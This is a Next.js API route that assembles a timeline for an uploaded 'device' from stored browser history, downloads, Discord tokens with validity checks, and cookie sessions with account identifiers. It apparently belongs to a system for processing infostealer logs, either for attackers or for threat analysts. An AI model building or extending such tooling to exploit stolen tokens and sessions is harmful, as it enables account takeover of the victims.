import { NextRequest, NextResponse } from "next/server"
import { executeQuery } from "@/lib/mysql"
import { validateRequest } from "@/lib/auth"
import { sanitizeDeviceId } from "@/lib/input-sanitization"

interface TimelineEvent {
  timestamp: string
  event_type: string
  category: string
  description: string
  metadata?: any
  icon?: string
  color?: string
}

export async function GET(
  request: NextRequest,
  { params }: { params: { deviceId: string } }
) {
  // Validate authentication
  const user = await validateRequest(request)
  if (!user) {
    return NextResponse.json({ success: false, error: "Unauthorized" }, { status: 401 })
  }

  try {
    // Sanitize device ID
    const deviceId = sanitizeDeviceId(params.deviceId)

    const timeline: TimelineEvent[] = []

    // Get device upload event
    const device = (await executeQuery(
      `SELECT upload_date, device_name, upload_batch FROM devices WHERE device_id = ?`,
      [deviceId]
    )) as any[]

    if (device.length > 0) {
      timeline.push({
        timestamp: device[0].upload_date,
        event_type: "device_upload",
        category: "system",
        description: `Device "${device[0].device_name}" uploaded (Batch: ${device[0].upload_batch})`,
        icon: "Upload",
        color: "blue",
      })
    }

    // Get latest browser history (top 10)
    const recentHistory = (await executeQuery(
      `SELECT url, title, visit_time, browser
       FROM browser_history
       WHERE device_id = ? AND visit_time IS NOT NULL
       ORDER BY visit_time DESC
       LIMIT 10`,
      [deviceId]
    )) as any[]

    recentHistory.forEach((item) => {
      timeline.push({
        timestamp: item.visit_time,
        event_type: "browser_visit",
        category: "browsing",
        description: `Visited: ${item.title || item.url}`,
        metadata: { browser: item.browser, url: item.url },
        icon: "Globe",
        color: "purple",
      })
    })

    // Get latest downloads (top 10)
    const recentDownloads = (await executeQuery(
      `SELECT file_path, download_url, start_time, browser
       FROM downloads
       WHERE device_id = ? AND start_time IS NOT NULL
       ORDER BY start_time DESC
       LIMIT 10`,
      [deviceId]
    )) as any[]

    recentDownloads.forEach((item) => {
      timeline.push({
        timestamp: item.start_time,
        event_type: "file_download",
        category: "downloads",
        description: `Downloaded: ${item.file_path}`,
        metadata: { browser: item.browser, url: item.download_url },
        icon: "Download",
        color: "green",
      })
    })

    // Get Discord token validation events
    const discordTokens = (await executeQuery(
      `SELECT username, is_valid, last_validated_at
       FROM discord_tokens
       WHERE device_id = ? AND last_validated_at IS NOT NULL
       ORDER BY last_validated_at DESC`,
      [deviceId]
    )) as any[]

    discordTokens.forEach((item) => {
      timeline.push({
        timestamp: item.last_validated_at,
        event_type: "discord_validation",
        category: "messaging",
        description: `Discord token validated: ${item.username} (${item.is_valid ? "Valid" : "Invalid"})`,
        metadata: { username: item.username, is_valid: item.is_valid },
        icon: "MessageCircle",
        color: item.is_valid ? "green" : "red",
      })
    })

    // Get cookie sessions with expiry dates
    const cookieSessions = (await executeQuery(
      `SELECT service, service_category, account_identifier, session_valid, expires_at
       FROM cookie_sessions
       WHERE device_id = ? AND expires_at IS NOT NULL
       ORDER BY expires_at DESC
       LIMIT 20`,
      [deviceId]
    )) as any[]

    cookieSessions.forEach((item) => {
      timeline.push({
        timestamp: item.expires_at,
        event_type: "session_expiry",
        category: "sessions",
        description: `${item.service} session ${item.session_valid ? "expires" : "expired"}: ${item.account_identifier || "Unknown"}`,
        metadata: {
          service: item.service,
          category: item.service_category,
          valid: item.session_valid,
        },
        icon: "Cookie",
        color: item.session_valid ? "yellow" : "gray",
      })
    })

    // Sort timeline by timestamp (most recent first)
    timeline.sort((a, b) => new Date(b.timestamp).getTime() - new Date(a.timestamp).getTime())

    // Group by date for easier visualization
    const groupedTimeline: Record<string, TimelineEvent[]> = {}

    timeline.forEach((event) => {
      const date = new Date(event.timestamp).toISOString().split("T")[0]
      if (!groupedTimeline[date]) {
        groupedTimeline[date] = []
      }
      groupedTimeline[date].push(event)
    })

    return NextResponse.json({
      success: true,
      device_id: deviceId,
      total_events: timeline.length,
      timeline,
      grouped_timeline: groupedTimeline,
    })
  } catch (error) {
    console.error("Error fetching device timeline:", error)
    return NextResponse.json(
      {
        success: false,
        error: "Failed to fetch device timeline",
        details: error instanceof Error ? error.message : "Unknown error",
      },
      { status: 500 }
    )
  }
}
